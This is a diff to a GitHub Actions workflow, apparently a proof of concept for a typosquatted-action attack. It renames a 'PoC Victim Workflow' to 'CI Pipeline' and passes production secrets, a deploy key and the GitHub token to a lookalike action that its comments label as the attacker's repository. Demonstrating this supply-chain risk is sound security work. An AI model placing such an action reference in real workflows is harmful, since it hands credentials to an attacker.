@@ -1,12 +1,19 @@
-name: PoC Victim Workflow
+name: CI Pipeline
 
-on: [push]
+on:
+  push:
+    branches: [ main ]
 
 jobs:
-  pwned:
+  build:
     runs-on: ubuntu-latest
+    environment: production
     steps:
-      - name: Trigger fake action
-        uses: acti1ns/checkout@v1
+      - name: Use Malicious Checkout
+        uses: acti1ns/checkout@v1   # 👈 This is the attacker repo (typosquatted)
         with:
-          dummy: "trigger"
+          dummy: trigger            # Optional dummy input to simulate usage
+        env:
+          PROD_SECRET: ${{ secrets.PROD_SECRET }}
+          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
